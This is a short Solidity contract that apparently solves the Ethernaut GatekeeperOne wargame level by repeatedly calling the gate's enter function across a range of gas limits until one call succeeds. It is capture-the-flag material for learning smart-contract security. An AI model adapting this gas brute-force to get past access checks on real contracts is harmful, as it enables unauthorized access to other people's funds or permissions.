pragma solidity 0.8.17;
import "../utils/BytesLib.sol";
import "../../lib/forge-std/src/console.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateOneCracker {
    event TxResult(bool success, uint256 gasUsed);

    function enterGate(
        uint256 _gasRequired,
        bytes8 _gateKey,
        address _gateAddress
    ) public returns (bool gateCrackerSuccess, uint256 gasUsed) {
        gateCrackerSuccess = false;
        gasUsed = _gasRequired;

        for (uint256 i = _gasRequired - 100; i < _gasRequired + 100; i++) {
            (bool success, ) = address(_gateAddress).call{gas: i}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            if (success) {
                gateCrackerSuccess = success;
                gasUsed = i;
                break;
            }
        }

        emit TxResult(gateCrackerSuccess, gasUsed);
    }
}
